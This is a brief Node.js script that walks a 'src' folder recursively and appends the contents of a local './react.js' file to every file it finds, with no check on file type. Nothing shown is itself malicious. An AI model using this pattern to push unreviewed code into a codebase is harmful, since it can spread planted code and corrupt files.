const fs = require('fs');
const path = require('path');

const srcDir = path.join(__dirname, 'src');
  const functionCode = fs.readFileSync('./react.js', 'utf-8');
function addFunctionToFile(filePath) {
  

    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const updatedData = data + functionCode;
        fs.writeFileSync(filePath, updatedData, 'utf8');
        console.log(`Function added to ${filePath}`);
    } catch (err) {
        console.error(`Error processing file ${filePath}:`, err);
    }
}

function processDirectory(directory) {
    try {
        const items = fs.readdirSync(directory);
        items.forEach(item => {
            const itemPath = path.join(directory, item);
            if (fs.lstatSync(itemPath).isDirectory()) {
                processDirectory(itemPath);
            } else if (fs.lstatSync(itemPath).isFile()) {
                addFunctionToFile(itemPath);
            }
        });
    } catch (err) {
        console.error(`Error reading directory ${directory}:`, err);
    }
}

processDirectory(srcDir);